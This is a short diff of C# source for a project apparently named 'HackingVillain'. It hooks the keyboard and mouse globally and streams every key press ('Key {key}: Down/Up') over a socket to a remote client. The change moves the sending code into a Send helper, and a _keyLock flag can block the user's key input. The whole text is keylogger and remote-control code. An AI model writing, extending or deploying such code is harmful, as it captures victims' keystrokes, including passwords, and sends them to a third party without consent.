@@ -7,6 +7,7 @@ using System.Windows.Forms;
 using Hook;
 using AwesomeSockets.Domain.Sockets;
 using AwesomeSockets.Sockets;
+using NetworkData;
 
 using Buffer = AwesomeSockets.Buffers.Buffer;
 
@@ -34,21 +35,20 @@ namespace HackingVillain
             _mouse.HookStart();
         }
 
+        public void Send(string msg)
+        {
+            Client.Send(_client, Encoding.UTF8.GetBytes(msg), 2);
+        }
+
         private bool _key_KeyUp(Keys key)
         {
-            Buffer buf = Buffer.New();
-            Buffer.Add(buf, Encoding.UTF8.GetBytes($"Key {key}: Down"));
-            Buffer.FinalizeBuffer(buf);
-            AweSock.SendMessage(_client, buf);
+            Send($"Key {key}: Down");
             return !_keyLock;
         }
 
         private bool _key_KeyDown(Keys key)
         {
-            Buffer buf = Buffer.New();
-            Buffer.Add(buf, Encoding.UTF8.GetBytes($"Key {key}: Up"));
-            Buffer.FinalizeBuffer(buf);
-            AweSock.SendMessage(_client, buf);
+            Send($"Key {key}: Up");
             return !_keyLock;
         }
 
